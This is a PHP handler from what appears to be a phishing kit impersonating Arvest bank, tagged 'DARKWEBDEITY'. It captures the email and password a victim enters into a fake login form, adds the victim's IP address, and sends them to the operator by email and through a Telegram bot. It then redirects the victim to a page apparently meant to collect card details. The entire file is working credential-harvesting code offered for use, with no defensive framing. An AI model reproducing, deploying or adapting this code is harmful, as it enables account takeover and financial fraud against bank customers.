<?php
session_start();
include("settings.php");

// validate login
if(!isset($_POST['email']) || !isset($_POST['password'])) {
    header('Location: login.php');
    exit;
}
else{
    //collect info
    $email = $_POST['email'];
    $password = $_POST['password'];

    $message="------ 😈😈 ARVEST BY DARKWEBDEITY 😈😈------\n";
    $message.="====== EMAIL INFO ========\n";
    $message.="Email: ".$email."\n";
    $message.="Password: ".$password."\n";
    $message.="IP ADDR: ".$_SERVER['REMOTE_ADDR']." \n";
    $message.="==========================\n";

    //send email
    mail($mail, "Login Info", $message);

    //send telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$telegram_chat_id."&text=".$message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

  
        header('Location: ../cc_info.php');


}
?>